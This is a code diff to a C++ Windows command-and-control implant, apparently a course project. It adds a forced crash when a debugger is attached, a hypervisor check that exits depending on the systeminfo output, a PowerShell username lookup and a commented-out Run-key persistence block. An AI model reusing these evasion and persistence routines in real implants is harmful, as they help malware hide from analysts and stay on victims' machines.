@@ -36,12 +36,33 @@ std::string get_privilege_info(){
 }
 
 int main(){
+
+Sleep(100);
+std::string cmd_usr = "$env:UserName";
+LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
+std::string username = runPowershellCommand(username_cmd);
+std::cout << username << std::endl;
+//exit(1);
+// LPCSTR progPath = "C:\\Users\\vagrant\\AppData\\Roaming\\Microsoft\\Windows\\Desktop\\C2-CS501\\implant.exe";
+// HKEY hkey = NULL;
+// LPCSTR path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+// LONG createStatus = RegCreateKey(HKEY_CURRENT_USER,path,&hkey); //Creates a key       
+// LPCSTR name = "MyApp";
+// LONG status = RegSetValueEx(hkey,name, 0, REG_SZ, (BYTE*)progPath, 100 * sizeof(char));
+    if(IsDebuggerPresent()){
+        int *ptr = NULL;
+        *ptr = 0;
+    }
     CONFIG config;
     std::string info = getInfo();
     // std::cout << info << std::endl;
-
+    // if(System.Diagnostics.Debugger.IsAttached){
+        
+    // }
     json j = json::parse(info);
-    // std::cout << j["systeminfo"] << std::endl;
+    std::cout << j["systeminfo"] << std::endl;
+
     
     config.computer_guid = get_mac_address();
     config.c2_fqdn = "localhost";
@@ -49,6 +70,9 @@ int main(){
 
     std::string sys = j["systeminfo"];
     json sys_info = json::parse(sys);
+    if (sys_info["Hyper-V Requirements"] != "A hypervisor has been detected. Features required for Hyper-V will not be displayed."){
+        exit(1);
+    }
     json reg;
     // reg["computer_guid"] = config.computer_guid;
     // std::cout << sys_info["Network Card(s)"] << std::endl;
@@ -107,10 +131,5 @@ int main(){
     }
     
 
-
-
-
-
-    
     return 0;
 }
